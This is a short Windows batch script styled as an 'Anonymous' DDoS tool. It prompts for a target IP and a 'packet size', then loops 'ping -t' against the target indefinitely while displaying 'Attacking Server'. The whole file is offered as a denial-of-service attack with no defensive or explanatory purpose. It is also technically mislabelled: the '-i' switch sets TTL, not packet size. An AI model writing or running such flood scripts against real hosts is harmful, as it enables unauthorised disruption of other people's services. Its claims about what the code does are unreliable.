@echo off
mode 67,16
title DDOS Attack
color 40
cls
echo.
echo     .-          
echo   .-  .-       
echo  .-    .-     
echo  .-.-.-.-.   NONYMOUS
echo  .-     .-     
echo  .-     .-      
echo  .-     .-      
echo.
set /p x=Server:
echo.
ping %x%
@ping.exe 127.0.0.1 -n 5 -w 1000 > nul
goto Next
:Next
echo.
echo.
echo.
set /p m=ip Host:
echo.
set /p n=Packet Size:
echo.
:DDOS
color 04
echo Attacking Server %m%
ping %m% -i %n% -t >nul
goto DDOS
